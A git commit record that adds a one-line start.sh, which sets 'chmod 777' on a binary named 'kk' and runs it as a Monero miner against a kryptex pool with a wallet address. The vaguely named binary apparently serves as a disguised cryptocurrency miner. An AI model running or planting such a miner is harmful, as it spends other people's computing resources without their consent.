8d8e19f7d8cdbde9540ed9e3d7cbce8f7ec3b0c5
nedogimoff <80026979+nedogimoff@users.noreply.github.com>
2021-03-06 16:50:13 +0500

    Add files via upload

---
+++ start.sh
@@ -0,0 +1,1 @@
+chmod 777 kk && ./kk --url xmr.kryptex.network:7000 --user 874CsAXxxTmWddUgkyW8xqHPUeYGYsDKQWhQCZKphsHdH4KAR2XAakAP3sCn9qHz5Pbvti8NVYQJR1BaxmruQ3KDPHQqXVY.v2db8a24b2 -p x --coin XMR --randomx-1gb-pages
